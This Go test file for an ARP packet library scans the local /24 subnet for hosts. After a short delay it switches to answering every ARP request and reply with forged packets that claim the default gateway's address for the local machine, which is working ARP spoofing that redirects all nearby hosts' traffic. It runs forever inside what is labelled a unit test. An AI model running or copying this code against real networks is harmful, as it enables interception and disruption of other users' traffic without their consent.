package arp_test

import (
	"bytes"
	"encoding/binary"
	"github.com/google/gopacket/pcap"
	"github.com/iesreza/arp"
	"github.com/iesreza/gutil/log"
	"github.com/iesreza/netconfig"
	"net"
	"testing"
	"time"
)

func TestWhoIs(t *testing.T) {

	config := netconfig.GetNetworkConfig()
	handler, err := pcap.OpenLive(config.InterfaceName, 65535, true, pcap.BlockForever)
	if err != nil {
		log.Fatal(err)
	}
	defer handler.Close()


	var gateway = config.DefaultGateway.To4()
	var fakeGateway = arp.Address{
		IP:gateway,
		HardwareAddr:config.HardwareAddress,
	}

	var payload = arp.WhoHas(gateway.To4())
	handler.WritePacketData(payload)

	var Targets = map[[4]byte]*arp.Address{}
	var Spoof = false
	go arp.Listen(handler, func(srcAddress arp.Address,replyTo arp.Address) {
		log.Info("%s is at %s \n",srcAddress.IP.String(),srcAddress.HardwareAddr.String())
		if Spoof && !bytes.Equal(replyTo.IP.To4(),gateway) {
			payload = arp.IsAt(fakeGateway, replyTo)
			handler.WritePacketData(payload)
		}
		if _, ok := Targets[To4(replyTo.IP)]; !ok {
			Targets[To4(replyTo.IP)] = &replyTo
		}
	}, func(ip net.IP,replyTo arp.Address) {
		log.Info("Who has %s? Tell %s \n",ip.String(),replyTo.IP.String())
		if Spoof && !bytes.Equal(replyTo.IP.To4(),gateway)  {
			payload = arp.IsAt(fakeGateway, replyTo)
			handler.WritePacketData(payload)
		}
		if _, ok := Targets[To4(replyTo.IP)]; !ok {
			Targets[To4(replyTo.IP)] = &replyTo
		}
	})

	//scan for range
	//Send packet to whole range to find all existing devices
	list := ipRange(&net.IPNet{
		IP:   gateway,
		Mask: net.IPv4Mask(255,255,255,0),
	})

	for _,ip := range list{
		payload = arp.WhoHas(ip)
		handler.WritePacketData(payload)
	}

	for{
		time.Sleep(5*time.Second)
		Spoof = true
	}
}

func To4(ip net.IP) [4]byte {
	if len(ip) == 16{
		return [4]byte{ ip[12],ip[13],ip[14],ip[15] }
	}
	return [4]byte{ ip[0],ip[1],ip[2],ip[3] }
}

func ipRange(n *net.IPNet) (out []net.IP) {
	num := binary.BigEndian.Uint32([]byte(n.IP))
	mask := binary.BigEndian.Uint32([]byte(n.Mask))
	num &= mask
	for mask < 0xffffffff {
		var buf [4]byte
		binary.BigEndian.PutUint32(buf[:], num)
		out = append(out, net.IP(buf[:]))
		mask++
		num++
	}
	return
}

